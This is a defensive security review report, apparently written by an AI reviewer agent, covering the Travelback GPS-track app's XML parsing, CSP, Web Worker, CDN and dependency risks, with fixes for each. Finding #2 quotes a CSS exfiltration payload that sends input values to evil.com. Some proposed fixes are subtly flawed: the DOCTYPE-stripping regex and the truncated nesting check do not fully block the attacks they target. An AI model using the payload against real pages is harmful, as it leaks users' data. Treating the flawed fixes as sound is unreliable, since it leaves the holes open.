# Security Review Report

**Scope:** Full Travelback codebase — `src/`, `public/`, `scripts/`, `e2e/`, `next.config.ts`, `package.json`
**Risk Level:** MEDIUM
**Reviewed by:** Security Reviewer agent
**Date:** 2026-04-18

## Summary
- Critical Issues: 0
- High Issues: 3
- Medium Issues: 7
- Low Issues: 5

The application is a client-side-only static export with a strong privacy posture: no server-side processing, no analytics, no tracking pixels, geocoding consent-gated and removed, map tiles fully local, and a robust CSP hardening pipeline. The remaining issues center on XML parsing without sanitization, CSP trust boundaries with a CDN, and defense-in-depth gaps around the Web Worker and export paths.

---

## High Issues

### 1. XML Parsing Without Sanitization Enables XSS via Malicious GPX/KML
**File:** `src/lib/parser.ts:86-87,125-126`
**Category:** XSS / Injection (OWASP A03)
**Problem:** `parseGPX()` and `parseKML()` use `DOMParser().parseFromString(text, 'application/xml')` to parse user-provided XML. While `application/xml` prevents automatic script execution, the parsed DOM is then queried with `querySelector` and `getElementsByTagName` and its text content is extracted into the `Track.name` field. That `track.name` value is later rendered in the UI via JSX text interpolation (`{track.name}` in `TrackWorkspace.tsx:120`) and used in download filenames (`videoEncoder.ts:125-131`). React's JSX escapes text content, so direct XSS from `track.name` in JSX is mitigated. However, the `DOMParser` with `application/xml` does not neutralize XML entity expansion attacks (billion laughs), and the parsed document's `textContent` is trusted without any DOMPurify or similar sanitization pass. More critically, if the document is parsed as `text/html` (which is NOT the current case but is a common misconfiguration), script execution would be immediate. The current `application/xml` type is a correct mitigation, but there is no defense-in-depth.

**Attack vector:** A crafted GPX/KML file with a deeply nested XML entity chain (`<!ENTITY ...>`) could cause exponential memory consumption (XML bomb / billion laughs attack), crashing the browser tab. The 200MB file size limit in `FileUpload.tsx` mitigates but does not eliminate this — a small file can expand to gigabytes of DOM nodes.

**Fix:**
```typescript
// In parseGPX / parseKML, before DOMParser, strip DTD declarations
function stripXmlEntities(text: string): string {
  // Remove DOCTYPE and entity declarations that enable XML bombs
  return text.replace(/<!DOCTYPE[^>]*>/gi, '').replace(/<!ENTITY[^>]*>/gi, '')
}

function parseGPX(text: string): Track {
  const safeText = stripXmlEntities(text)
  const doc = new DOMParser().parseFromString(safeText, 'application/xml')
  // Check for parse errors (DOMParser returns <parsererror> for malformed XML)
  const parseError = doc.querySelector('parsererror')
  if (parseError) {
    throw new Error('Invalid GPX file: XML parse error')
  }
  // ... rest of parsing
}
```

### 2. CSP Allows `unsafe-inline` for Styles — Style Injection Vector
**File:** `src/app/layout.tsx:62`, `scripts/harden-static-export.mjs:16`
**Category:** Security Misconfiguration (OWASP A05)
**Problem:** Both the development CSP and the hardened production CSP include `style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net`. The `unsafe-inline` for styles allows any inline style attribute or `<style>` tag to execute. While CSS-based attacks are less severe than script injection, they enable:
- UI redressing / clickjacking via CSS `opacity`, `position`, `pointer-events` manipulation
- Data exfiltration via CSS attribute selectors (`input[value^='a'] { background: url(https://evil.com/?data=a) }`) — though this is mitigated by `connect-src 'self'` blocking the exfiltration request
- Keylogging via CSS `:focus` selectors on inputs

The CDN trust for `https://cdn.jsdelivr.net` in both `style-src` and `font-src` allows loading arbitrary stylesheets from that CDN. If the CDN is compromised or a malicious package is published, it could inject CSS.

**Attack vector:** If a CSP bypass exists (e.g., through the CDN or a future script injection), CSS can be leveraged for data exfiltration. The `connect-src 'self'` mitigates the most severe CSS exfiltration, but `img-src blob: data:` allows `<img src>` exfiltration from CSS backgrounds. An attacker who can inject CSS could use `background-image: url(...)` with data URIs or blob URIs that encode sensitive values.

**Fix:**
```javascript
// In harden-static-export.mjs, restrict CDN to specific resource hashes
"style-src 'self' 'unsafe-inline'",
"font-src 'self'",
// Remove https://cdn.jsdelivr.net from style-src and font-src
// Instead, self-host the Pretendard font or pin to a specific SRI hash
```
Additionally, consider removing `'unsafe-inline'` from `style-src` by using nonce-based or hash-based style policies (requires Next.js CSS extraction configuration).

### 3. No Origin Validation on Web Worker postMessage
**File:** `public/workers/trackParser.worker.js:168-178`, `src/lib/parser.ts:390`
**Category:** Broken Access Control (OWASP A01)
**Problem:** The Web Worker accepts `postMessage({ ext: 'json', text })` without validating the origin of the message. Any script running in the page (including any future XSS, compromised CDN script, or browser extension) can send arbitrary data to the worker. The worker then calls `JSON.parse()` on the `text` field, which with a malicious payload could trigger prototype pollution via the transitive `protocol-buffers-schema` dependency (npm audit CVE). Additionally, the worker sends back `postMessage({ track: ... })` with no origin check — any window that receives this message gets the parsed location data.

While Web Workers are same-origin by design (only the creating page can communicate), the lack of explicit origin validation is a defense-in-depth gap. If the app is ever embedded in an iframe (despite `frame-ancestors 'none'`), or if a service worker intercepts messages, the worker could be exploited.

**Attack vector:** A compromised CDN script (from finding #2) sends a crafted JSON payload to the worker, causing it to parse a malicious Google Location History file that triggers prototype pollution in the dependency chain, potentially corrupting the main thread's JavaScript objects.

**Fix:**
```javascript
// In trackParser.worker.js
self.onmessage = (event) => {
  // Validate message structure
  if (!event.data || typeof event.data !== 'object') return
  if (typeof event.data.ext !== 'string' || typeof event.data.text !== 'string') return
  if (event.data.ext !== 'json') return

  // Limit input size (the main thread also checks, but double-enforce)
  if (event.data.text.length > 200 * 1024 * 1024) {
    self.postMessage({ error: 'Input too large' })
    return
  }

  try {
    self.postMessage({ track: parseGoogleLocationHistory(event.data.text) })
  } catch (error) {
    self.postMessage({ error: error instanceof Error ? error.message : 'Failed to parse track file' })
  }
}
```

---

## Medium Issues

### 4. Track Name Rendered Without Sanitization in Map Load Error Message
**File:** `src/components/MapView.tsx:842`
**Category:** XSS (OWASP A03)
**Problem:** The map error handler renders `t('app.mapLoadFailed').replace('{error}', mapError)`. The `mapError` string comes from `err instanceof Error ? err.message : 'Failed to initialize WebGL map'` (MapView.tsx:540), which is a browser/MapLibre error message — not user-controlled. However, the pattern of using `.replace()` to interpolate values into display text without escaping is fragile. If a future change introduces user-controlled data into this path, it could become an XSS vector. React's JSX text interpolation (`{...}`) auto-escapes, but `.replace()` on the string before JSX rendering means the replacement happens at the string level first.

**Attack vector:** Not directly exploitable now because `mapError` is not user-controlled. The risk is architectural — the `.replace()` interpolation pattern is used in multiple places and could be misused in future development.

**Fix:**
```typescript
// Use React's built-in escaping by constructing the message differently:
<p>{t('app.mapLoadFailed').split('{error}')[0]}{mapError}{t('app.mapLoadFailed').split('{error}')[1]}</p>
// Or create a dedicated interpolation helper that returns ReactNode
```

### 5. CDN Dependency Without Full SRI for Font Stylesheet
**File:** `src/app/layout.tsx:67-70`
**Category:** Supply Chain / Integrity Failure (OWASP A08)
**Problem:** The Pretendard font stylesheet loaded from `cdn.jsdelivr.net` has an SRI hash (`integrity="sha384-GIdEBaqGN9mNkDkMkzMHW8EKUqtpPIe/sLj1X7DIrnc9uPtLROJgmuDlh+3rBw0j"`) and `crossOrigin="anonymous"`. This is good practice. However, the stylesheet itself may contain `@import` or `url()` references to other resources on the CDN or elsewhere, and those sub-resources are NOT integrity-checked. If the font CSS file is updated on the CDN to include a reference to a malicious resource, SRI only verifies the CSS file itself, not what it loads.

Additionally, the CSP allows `https://cdn.jsdelivr.net` for both `style-src` and `font-src`, meaning the browser will load any resource from that origin, not just the specific font file.

**Attack vector:** If the CDN serves a compromised CSS file that passes SRI (e.g., the CSS file is intentionally updated by the package maintainer with malicious `@font-face` URLs), the browser would follow those URLs to load fonts from arbitrary origins allowed by the CSP.

**Fix:**
```html
<!-- Self-host the font file instead of relying on CDN -->
<link rel="stylesheet" href="/fonts/pretendard.css" />
```
And remove `https://cdn.jsdelivr.net` from the CSP, replacing it with `'self'` only.

### 6. `JSON.parse()` on Untrusted Input Without Size Limit in Worker
**File:** `public/workers/trackParser.worker.js:121`, `src/lib/parser.ts:285`
**Category:** DoS (OWASP A04 — Insecure Design)
**Problem:** The worker receives the full text of a JSON file and immediately calls `JSON.parse()` on it. While the main thread enforces a 200MB file size limit (`FileUpload.tsx:18`), the worker does not independently validate the input size. If the worker is ever called from a code path that bypasses the `FileUpload` size check, or if the `FileReader.readAsText()` reads more data than the `file.size` check anticipates (e.g., due to encoding differences), the worker could attempt to parse an extremely large JSON string.

More importantly, `JSON.parse()` on deeply nested JSON objects can cause stack overflow. A malicious JSON file with thousands of levels of nesting (`[[[[[...]]]]]`) will crash the V8 parser even at small file sizes.

**Attack vector:** A crafted JSON file under 200MB but with extreme nesting depth causes the worker (or the main thread fallback) to crash with a stack overflow, causing a denial of service that may also crash the browser tab.

**Fix:**
```javascript
// Before JSON.parse, validate nesting depth
function safeJsonParse(text, maxDepth = 100) {
  let depth = 0
  for (let i = 0; i < text.length && i < 10000; i++) {
    if (text[i] === '[' || text[i] === '{') depth++
    if (text[i] === ']' || text[i] === '}') depth--
    if (depth > maxDepth) throw new Error('JSON nesting too deep')
  }
  return JSON.parse(text)
}
```

### 7. Blob URL Not Revoked on Component Unmount Edge Case
**File:** `src/lib/useExportController.ts:134-136,44-49`
**Category:** Memory Leak / Resource Exhaustion (OWASP A04)
**Problem:** When `exportTrack` succeeds, a blob URL is created (`URL.createObjectURL(blob)`) and stored in `exportedVideoUrl` state. The `useEffect` cleanup on unmount revokes the URL via `exportedVideoUrlRef`. However, if the component unmounts during the `await exportVideo()` call (between lines 120-136), the `finally` block sets `isExporting = false` but the blob URL from a concurrent render may not be properly tracked. The `revokeExportedVideoUrl` function is called at the start of each export, but if the component is force-unmounted while the export is in-flight, the `finally` block's `mapViewRef.current?.resetSize()` may fail silently.

More significantly, the blob containing the full video (`result.buffer`) is held in memory until the blob URL is revoked. For a 4K export at high bitrate, this could be hundreds of megabytes. The `downloadVideo()` function creates a temporary `<a>` element and clicks it, but the blob URL persists in state until `resetExportSession` is called or the component unmounts.

**Attack vector:** A user exports multiple large videos without clicking "Export Again" (which calls `resetExportSession`), causing blob URLs and their backing ArrayBuffers to accumulate in memory, potentially exhausting browser memory.

**Fix:**
```typescript
// Revoke previous blob URL immediately after download
const blob = new Blob([result.buffer], { type: result.mimeType })
const videoUrl = URL.createObjectURL(blob)
downloadVideo(videoUrl, result.filename)
// Auto-revoke after a delay to allow the download to start
setTimeout(() => {
  URL.revokeObjectURL(videoUrl)
}, 30000) // 30 seconds should be enough for the download to initiate
setExportedVideoUrl(null) // Don't keep the URL in state
```

### 8. localStorage Reads Without Strict Validation
**File:** `src/lib/i18n.ts:1688-1695`, `src/lib/interpolate.ts:138-143`, `src/components/TimelineSelector.tsx:46-51`
**Category:** Injection (OWASP A03)
**Problem:** The app reads from `localStorage` for locale preference, unit preference, and a hint dismissal flag. The locale and unit values are validated against allowlists (`VALID_LOCALES`, `'metric' | 'imperial'`), which is correct. However, the TimelineSelector reads `HINT_DISMISSED_KEY` and checks only for truthiness (`localStorage.getItem(HINT_DISMISSED_KEY)`), not for a specific expected value. This is a very minor issue since the value is only used to show/hide a UI hint, but it represents a pattern where localStorage values are consumed without full validation.

More importantly, the `try/catch` blocks silently swallow `localStorage` errors. If a browser extension or privacy setting blocks localStorage access, the app silently falls back to defaults, which is correct behavior. No sensitive data is stored in localStorage — only user preferences.

**Attack vector:** If an attacker can write to localStorage (via a separate XSS in another same-origin app, or via a browser extension), they could set `travelback-locale` to a value that passes the `VALID_LOCALES` check but triggers unexpected behavior. However, since the allowlist is strict (`['en', 'ko', 'ja', 'zh', 'es']`), this is not exploitable in practice.

**Fix:** No action required for the current code. The allowlist validation is sufficient. Consider adding a comment documenting the trust boundary for future maintainers.

### 9. Google Guide External Link Opens Without Referrer Policy
**File:** `src/components/GoogleGuide.tsx:336-344`
**Category:** Information Disclosure (OWASP A02)
**Problem:** The Google Guide component includes a link to `https://takeout.google.com` with `target="_blank"` and `rel="noopener noreferrer"`. This is correct — the `noopener` prevents the new page from accessing `window.opener`, and `noreferrer` prevents sending the referrer. No issue with this specific link. However, the app does not set a global `Referrer-Policy` header or meta tag. The default referrer policy in browsers is `strict-origin-when-cross-origin`, which sends the full origin to same-origin requests and the origin only to cross-origin requests. For a privacy-focused app, this could leak that the user is visiting the Travelback page.

**Attack vector:** When a user clicks the Google Takeout link, the referrer sent to Google includes `https://open330.github.io` (the production origin). While this is minimal information, it reveals that the user is using the Travelback app at that moment.

**Fix:**
```html
<!-- Add to layout.tsx <head> -->
<meta name="referrer" content="no-referrer" />
```
Or set the `Referrer-Policy` header in the harden script.

### 10. Prototype Pollution via Transitive Dependency
**File:** `package.json` (indirect dependency)
**Category:** Injection (OWASP A03)
**Problem:** `npm audit` reports a moderate-severity prototype pollution vulnerability in `protocol-buffers-schema` (GHSA-j452-xhg8-qg39, CVSS 6.5). This is a transitive dependency — it is not directly used by the application code but may be pulled in through the dependency tree. In a client-side-only application, the impact of prototype pollution is lower than server-side (no RCE), but it could still corrupt JavaScript object behavior if a malicious payload reaches the vulnerable code path.

**Attack vector:** A crafted file uploaded to the app triggers a code path that passes through `protocol-buffers-schema`, which pollutes `Object.prototype`. This could cause unexpected behavior in the application's data handling, potentially leading to incorrect track data or security check bypasses.

**Fix:**
```bash
npm update protocol-buffers-schema
# Or explicitly override in package.json:
# "overrides": { "protocol-buffers-schema": "^3.6.1" }
```

---

## Low Issues

### 11. Debug Interface Exposed in WebDriver Mode
**File:** `src/components/MapView.tsx:484-512`
**Category:** Information Disclosure (OWASP A02)
**Problem:** When `navigator.webdriver` is truthy (e.g., automated testing or debugging), the app exposes `window.__travelbackDebug` with camera state and map state accessors. This is intended for development and testing. However, `navigator.webdriver` can be truthy in non-development contexts — for example, if a user has a browser automation extension installed, or if corporate IT has installed monitoring software that sets this flag. The debug interface reveals the current map camera position, which could include the user's geographic location.

**Attack vector:** A script running in the page context (e.g., from a browser extension or another XSS) checks for `window.__travelbackDebug` and reads the camera state to determine the user's current map view, which may reveal their location.

**Fix:**
```typescript
// Only expose in development, not based on webdriver
const canExposeDebugCamera = process.env.NODE_ENV === 'development'
```

### 12. No Rate Limiting on File Upload Parsing
**File:** `src/components/FileUpload.tsx:34-71`, `src/lib/parser.ts:394-429`
**Category:** DoS (OWASP A04)
**Problem:** There is no rate limiting on how many files a user can upload or how quickly they can trigger parsing. While this is a client-side-only app (so the user is only DoSing themselves), a malicious page or browser extension could repeatedly trigger file uploads to consume CPU and memory, especially for the JSON parsing path which can process large Google Location History files.

**Attack vector:** An automated script repeatedly uploads files via the file input, causing continuous CPU-heavy parsing operations.

**Fix:** Add a simple debounce or parsing lock:
```typescript
const [isParsing, setIsParsing] = useState(false)
const handleFile = useCallback(async (file: File) => {
  if (isParsing) return
  setIsParsing(true)
  try {
    // ... existing logic
  } finally {
    setIsParsing(false)
  }
}, [isParsing, ...])
```

### 13. `preserveDrawingBuffer: true` Enables Canvas Data Extraction
**File:** `src/components/MapView.tsx:477`
**Category:** Information Disclosure (OWASP A02)
**Problem:** The MapLibre map is initialized with `canvasContextAttributes: { preserveDrawingBuffer: true }`. This is necessary for the video export feature (which reads canvas pixels frame-by-frame), but it also means the canvas content persists between frames. Any script running in the page context (from an XSS, compromised CDN, or browser extension) can call `canvas.toDataURL()` on the map canvas to extract the current map view, which may show the user's geographic location.

**Attack vector:** A malicious script extracts canvas data to determine the user's current map view location.

**Fix:** This is inherent to the video export feature and cannot be removed without breaking functionality. The mitigation is the strong CSP that prevents script injection. Document this as an accepted risk.

### 14. Track Name Used in Download Filename Without Full Sanitization for Path Traversal
**File:** `src/lib/videoEncoder.ts:125-131`
**Category:** Injection (OWASP A03)
**Problem:** The track name is sanitized before use as a filename: `normalize('NFKC')`, removal of `<>:"/\|?*` and control characters, whitespace normalization, and truncation to 64 characters. This is thorough and correct for most filesystems. However, the `downloadVideo()` function creates an `<a>` element with `a.download = filename` and `a.href = url`. The `download` attribute does not support path separators, so path traversal via `../` is not possible. The sanitization is effective.

One edge case: the `normalize('NFKC')` step could transform Unicode characters in unexpected ways (e.g., compatibility decompositions). This is a correctness issue, not a security issue.

**Attack vector:** Not directly exploitable. The sanitization is effective.

**Fix:** No action required. The current sanitization is sufficient.

### 15. Error Messages Logged to Console May Leak File Content
**File:** `src/lib/parser.ts:371,385`, `src/components/FileUpload.tsx:57`, `src/app/page.tsx:186-189`
**Category:** Information Disclosure (OWASP A09)
**Problem:** Error messages from file parsing are logged to the console via `console.error` and `console.warn`. In some cases, the raw error object is logged, which may include portions of the file content or internal parsing state. The `FileUpload` component correctly avoids logging the full error for known safe cases, but the `console.error('[Travelback] Parse error:', err)` on line 57 logs the full error object, which for a `SyntaxError` from `JSON.parse()` could include a preview of the problematic JSON text.

**Attack vector:** If the browser console is accessible to an attacker (e.g., through a compromised browser extension that reads console output), they could extract fragments of the user's uploaded files.

**Fix:**
```typescript
// Log only the error type and message, not the full object
if (!isSafe) console.error('[Travelback] Parse error:', err instanceof Error ? err.message : 'Unknown error')
```

---

## Privacy Analysis

### Data Flow Audit

| Data | Collected | Stored | Transmitted | Risk |
|------|-----------|--------|-------------|------|
| GPS track files | Client-side only | In-memory only | Never | None |
| Google Location History | Client-side only | In-memory only | Never | None |
| User locale preference | Client-side only | localStorage | Never | None |
| Unit preference | Client-side only | localStorage | Never | None |
| Hint dismissal state | Client-side only | localStorage | Never | None |
| Map camera position | Client-side only | In-memory only | Never | None |
| Exported video | Client-side only | Blob URL (memory) | Never | None |

### Geocoding / Nominatim

The codebase previously had Nominatim geocoding. The current code has **removed all Nominatim API calls**. The `JourneyCreator` component now only parses coordinates locally from pasted text (no network requests). The smoke test explicitly verifies that Nominatim is not in the CSP (`smoke-static.mjs:99`). This is excellent.

### External Network Requests

The only external network request in the application is:
1. **Pretendard font CSS** from `cdn.jsdelivr.net` — loaded on page load with SRI

All map styles are fully local (verified: `public/map-styles/*.json` have `"sources": {}` and no external tile URLs). The smoke test validates this programmatically (`assertMapStylesPinnedLocally`).

### Offline / Local Map Promise

The app correctly delivers on its offline/local map promise. All map styles are self-contained JSON with only background layers and no external tile sources. No network requests are made for map tiles.

---

## CSP Analysis

### Development CSP
```
default-src 'self'; script-src 'self' 'unsafe-inline'; script-src-attr 'none';
style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; font-src 'self' https://cdn.jsdelivr.net;
img-src 'self' blob: data:; connect-src 'self'; worker-src 'self' blob:;
child-src 'self' blob:; media-src 'self' blob:; object-src 'none';
base-uri 'none'; frame-ancestors 'none'; form-action 'self'; upgrade-insecure-requests;
```

### Production CSP (after harden script)
Same as above, but `script-src` replaces `'unsafe-inline'` with computed SHA-256 hashes of all inline scripts. This is a strong CSP.

**Strengths:**
- `object-src 'none'` — no Flash/Java
- `base-uri 'none'` — no base tag injection
- `frame-ancestors 'none'` — no iframe embedding
- `form-action 'self'` — no form submission to external sites
- `connect-src 'self'` — no XHR/fetch to external origins
- `script-src-attr 'none'` — no inline event handlers
- `upgrade-insecure-requests` — forces HTTPS
- Hash-based script allowlist in production

**Weaknesses:**
- `style-src 'unsafe-inline'` — allows CSS injection (see Finding #2)
- `https://cdn.jsdelivr.net` in style-src and font-src — broad CDN trust (see Finding #5)
- `img-src blob: data:` — could enable data exfiltration via CSS if CSS injection exists

---

## Dependency Audit

| Package | Version | Known CVEs | Severity |
|---------|---------|------------|----------|
| protocol-buffers-schema | <3.6.1 | GHSA-j452-xhg8-qg39 (prototype pollution) | Moderate |
| All other dependencies | Current | No known CVEs | N/A |

The `protocol-buffers-schema` vulnerability is a transitive dependency. Fix available via `npm update`.

---

## Security Checklist

- [x] No hardcoded secrets found (grep for api_key, password, secret, token — no matches)
- [x] No `innerHTML` or `dangerouslySetInnerHTML` usage
- [x] No `eval()` or `new Function()` usage
- [x] No SQL queries (client-side only app)
- [x] All inputs validated at file upload boundary (size, extension, point count)
- [ ] XML parsing lacks DTD/entity stripping (Finding #1)
- [ ] Web Worker lacks input validation (Finding #3)
- [x] Authentication/authorization — N/A (no auth, client-side only)
- [x] No analytics, tracking pixels, or third-party scripts (except CDN font)
- [x] Geocoding properly consent-gated and removed from current code
- [x] CSP present and hardened in production build
- [ ] CSP `unsafe-inline` for styles (Finding #2)
- [x] Map tiles fully local (no external tile requests)
- [x] No localStorage leaks of sensitive data (only preferences)
- [x] Blob URL cleanup on unmount implemented (with minor edge case — Finding #7)
- [x] SRI hash on CDN font stylesheet
- [ ] CDN trust boundary too broad (Finding #5)
- [x] `Referrer-Policy` could be stricter (Finding #9)
- [x] Dependency audit completed (1 moderate CVE)

---

## Risk Summary Table

| # | Severity | Title | Category | Exploitability | Blast Radius |
|---|----------|-------|----------|----------------|--------------|
| 1 | HIGH | XML entity expansion (billion laughs) via GPX/KML | DoS / XSS | Local, requires user to open file | Browser tab crash |
| 2 | HIGH | CSP `unsafe-inline` for styles + CDN trust | Security Misconfiguration | Remote, requires CDN compromise or CSP bypass | UI redressing, CSS data exfiltration |
| 3 | HIGH | No input validation in Web Worker | Broken Access Control | Local, requires script injection or compromised CDN | Worker DoS, potential prototype pollution |
| 4 | MEDIUM | `.replace()` interpolation pattern for error messages | XSS | Not currently exploitable | Potential future XSS |
| 5 | MEDIUM | CDN font without full sub-resource integrity | Supply Chain | Remote, requires CDN compromise | CSS/font injection |
| 6 | MEDIUM | No JSON nesting depth limit in worker | DoS | Local, requires user to open file | Browser tab crash |
| 7 | MEDIUM | Blob URL memory accumulation on repeated exports | DoS | Local, user-initiated | Memory exhaustion |
| 8 | MEDIUM | localStorage reads (mitigated by allowlists) | Injection | Not directly exploitable | Minor |
| 9 | MEDIUM | No global Referrer-Policy header | Information Disclosure | Remote | Leaks origin to Google |
| 10 | MEDIUM | Prototype pollution in transitive dependency | Injection | Local, complex chain | Potential data corruption |
| 11 | LOW | Debug interface exposed in WebDriver mode | Information Disclosure | Local, requires browser automation | Map camera position leak |
| 12 | LOW | No rate limiting on file upload parsing | DoS | Local, user DoS only | CPU/memory consumption |
| 13 | LOW | `preserveDrawingBuffer: true` enables canvas extraction | Information Disclosure | Local, requires script injection | Map view extraction |
| 14 | LOW | Track name filename sanitization (effective) | Injection | Not exploitable | None |
| 15 | LOW | Console error messages may leak file fragments | Information Disclosure | Local, requires console access | File content fragments |

---

## Top 5 Most Urgent Fixes

1. **Strip XML DTD/entity declarations before DOMParser** (Finding #1) — Add `stripXmlEntities()` preprocessing to `parseGPX()` and `parseKML()` to prevent billion laughs attacks. Also add `<parsererror>` detection.

2. **Add input validation to Web Worker** (Finding #3) — Validate message structure, types, and size in `trackParser.worker.js` before processing. Add a maximum nesting depth check before `JSON.parse()`.

3. **Remove CDN from CSP, self-host the font** (Findings #2, #5) — Download the Pretendard font CSS and woff2 files to `public/fonts/`, remove `https://cdn.jsdelivr.net` from both `style-src` and `font-src` in the CSP. This eliminates the CDN trust boundary entirely.

4. **Set a strict global Referrer-Policy** (Finding #9) — Add `<meta name="referrer" content="no-referrer" />` to `layout.tsx` to prevent any referrer leakage from the privacy-focused application.

5. **Update `protocol-buffers-schema`** (Finding #10) — Run `npm update protocol-buffers-schema` to resolve the known prototype pollution CVE, or add an override in `package.json` to pin to `^3.6.1`.
